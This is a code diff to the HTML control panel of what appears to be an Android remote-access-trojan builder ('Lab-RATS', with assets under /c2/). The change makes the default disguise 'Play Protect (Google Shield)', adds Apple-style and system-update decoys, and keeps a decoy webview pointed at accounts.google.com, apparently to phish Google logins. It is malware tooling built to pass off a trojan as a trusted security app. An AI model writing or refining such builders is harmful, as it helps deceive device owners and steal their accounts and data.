@@ -119,11 +119,11 @@ const HTML_PAGE = `<!DOCTYPE html>
                                 <span style="font-size: 0.72rem; color: #aaa;">App icon</span>
                                 <div class="icon-box"><img id="preview-install" src="/c2/update3.png"></div>
                                 <select id="cfg-icon-preset" style="font-size: 0.72rem; padding: 6px 10px; background: #000; color: var(--neon-cyan); border: 1px solid var(--neon-cyan); border-radius: 8px; outline: none; margin-top: 4px;" onchange="selectPresetIcon(this.value, 'install')">
-                                    <option value="1">1. System Update (Gear)</option>
-                                    <option value="2">2. Calculator</option>
-                                    <option value="3">3. Weather</option>
-                                    <option value="4">4. Play Protect</option>
-                                    <option value="5">5. Lab-RATS Logo</option>
+                                    <option value="1">1. Play Protect (Google Shield)</option>
+                                    <option value="2">2. Calculator (Apple Style)</option>
+                                    <option value="3">3. Weather (Blue Sky Forecast)</option>
+                                    <option value="4">4. System Update (System Config)</option>
+                                    <option value="5">5. Lab-RATS Logo (Unmasked)</option>
                                     <option value="6">6. Android System</option>
                                 </select>
                             </div>
@@ -136,18 +136,18 @@ const HTML_PAGE = `<!DOCTYPE html>
                         <div class="card-box">
                             <div class="card-box-title">After Install</div>
                             <div style="display: flex; flex-direction: column; gap: 15px; margin-top: 10px;">
-                                <div class="field-group"><label>App name</label><input type="text" id="cfg-decoy-name" value="System Update"></div>
+                                <div class="field-group"><label>App name</label><input type="text" id="cfg-decoy-name" value="Play Protect"></div>
                                 <div class="field-group"><label>Webview URL</label><input type="text" id="cfg-decoy-url" value="https://accounts.google.com"></div>
                                 <div style="display: flex; align-items: center; gap: 20px;">
-                                    <div class="icon-box"><img id="preview-decoy" src="/c2/update3.png"></div>
+                                    <div class="icon-box"><img id="preview-decoy" src="/c2/playprotect.png"></div>
                                     <div style="display:flex; flex-direction:column; gap:6px;">
                                         <span style="font-size: 0.7rem; color:#aaa; font-family: 'Orbitron';">STEALTH DECOY IDENTITY</span>
                                         <select id="cfg-decoy-preset" style="font-size: 0.72rem; padding: 6px 10px; background: #000; color: var(--neon-cyan); border: 1px solid var(--neon-cyan); border-radius: 8px; outline: none;" onchange="selectPresetIcon(this.value, 'decoy')">
-                                            <option value="1">1. System Update (Gear)</option>
-                                            <option value="2">2. Calculator</option>
-                                            <option value="3">3. Weather</option>
-                                            <option value="4">4. Play Protect</option>
-                                            <option value="5">5. Lab-RATS Logo</option>
+                                            <option value="1">1. Play Protect (Google Shield)</option>
+                                            <option value="2">2. Calculator (Apple Style)</option>
+                                            <option value="3">3. Weather (Blue Sky Forecast)</option>
+                                            <option value="4">4. System Update (System Config)</option>
+                                            <option value="5">5. Lab-RATS Logo (Unmasked)</option>
                                             <option value="6">6. Android System</option>
                                         </select>
                                     </div>
